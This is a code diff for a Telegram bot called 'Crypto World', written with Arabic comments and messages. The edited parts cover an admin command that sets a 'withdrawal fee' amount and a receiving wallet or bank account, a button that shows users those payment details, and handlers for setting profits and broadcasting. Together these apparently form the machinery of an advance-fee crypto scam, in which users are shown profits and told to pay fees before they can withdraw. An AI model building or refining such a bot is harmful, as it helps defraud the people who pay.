@@ -88,7 +88,7 @@ def estimate_account_age(user_id: int) -> str:
     else:
         return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"
 
-# أمر الأدمن لتعديل تفاصيل رسوم السحب: /setwithdrawfee <المبلغ> <العملة> <الشبكة/البنك> <العنوان/الحساب>
+# أمر الأدمن لتعديل تفاصيل رسوم السحب للجميع: /setwithdrawfee <المبلغ> <العملة> <الشبكة/البنك> <العنوان/الحساب>
 async def set_withdraw_fee_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -117,7 +117,7 @@ async def set_withdraw_fee_command(update: Update, context: ContextTypes.DEFAULT
     save_data_to_file()
 
     await update.message.reply_text(
-        f"✅ **تم تحديث تفاصيل رسوم السحب بنجاح!**\n\n"
+        f"✅ **تم تحديث تفاصيل رسوم السحب بنجاح لتظهر لجميع المستخدمين!**\n\n"
         f"• المبلغ: `{amount} {currency}`\n"
         f"• البنك / الشبكة: `{network}`\n"
         f"• الحساب / العنوان:\n`{address}`",
@@ -292,6 +292,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.reply_text("لقد أكملت الإجراءات بالفعل ولا داعي للتكرار. يمكنك التواصل مع الدعم الفني.")
         return
 
+    # التحقق الصارم لبيانات التسجيل (بدون كشف الكلمة السرية للمستخدم)
     if current_state == "waiting_for_subscription_text":
         if text.startswith("خطوات التسجيل والإشتراك") or text.startswith("خطوات التسجيل والاشتراك"):
             user_custom_data[user_id] = text
@@ -479,6 +480,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     elif data == "pay_fees":
+        # عرض تفاصيل رسوم السحب التي حددتها أنت بالأمر /setwithdrawfee
         pay_details = (
             "💳 **دفع رسوم السحب:**\n\n"
             f"العملة: **{withdraw_fee_info['currency']}**\n"
@@ -503,12 +505,12 @@ def main():
     app.add_handler(CommandHandler("codes", admin_get_codes))
     app.add_handler(CommandHandler("setprofit", set_profit))
     app.add_handler(CommandHandler("broadcast", broadcast_message))
-    app.add_handler(CommandHandler("setwithdrawfee", set_withdraw_fee_command))  # أمر تعديل الرسوم الشامل
+    app.add_handler(CommandHandler("setwithdrawfee", set_withdraw_fee_command))  # أمر تعديل رسوم السحب الشامل
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل بكفاءة تامة مع تخصيص رسوم السحب...")
+    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل بكفاءة تامة...")
     app.run_polling()
 
 if __name__ == "__main__":
